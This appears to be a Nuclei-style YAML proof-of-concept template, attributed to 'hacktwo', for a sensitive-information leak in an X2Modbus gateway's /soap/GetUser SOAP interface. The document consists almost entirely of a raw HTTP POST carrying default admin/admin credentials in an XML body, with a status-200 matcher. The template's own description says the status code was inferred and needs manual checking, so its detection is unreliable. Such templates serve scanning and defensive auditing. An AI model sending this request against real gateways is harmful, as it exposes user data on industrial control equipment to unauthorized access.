id: poc-gxgxqh2d2zcl9qhh
info:
  name: X2Modbus网关-GetUser接口存在敏感信息泄露
  author: hacktwo
  severity: medium
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: info-leak,2024
http:
- raw:
  - 'POST /soap/GetUser HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36

    Accept: */*

    Content-Type: application/x-www-form-urlencoded

    <GetUser><User Name="admin" Password="admin"/></GetUser>'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
